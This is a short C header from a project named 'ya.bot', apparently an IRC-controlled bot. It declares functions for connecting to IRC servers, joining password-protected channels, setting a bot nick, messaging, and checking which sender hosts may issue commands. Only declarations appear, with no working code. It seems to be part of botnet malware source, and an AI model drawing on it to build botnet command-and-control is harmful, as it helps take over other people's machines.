/*  ya.bot  */

bool irc_action(SOCKET bsock, char *pszAction, char *pszParameter);
bool irc_connect(int nServer);
bool irc_disconnect(SOCKET bsock, WSAEVENT wsaEvent);
bool irc_hostcompare(char *pszSender);
bool irc_join(SOCKET bsock, char *pszChannel, char *pszChannelPassword);
bool irc_message(SOCKET bsock, char *pszAction, char *pszDestination, char *pszMessage, ...);
DWORD WINAPI irc_ping(LPVOID param);
bool irc_setnick(SOCKET bsock, char *pszBuffer, DWORD dwSize);
bool irc_userinfo(SOCKET bsock, char *pszServer, char *pszServerPassword, char *pszBotNick);

typedef struct SIRCPing 
{
	SOCKET m_bsock;
	int m_nServer;
} SIRCPing;
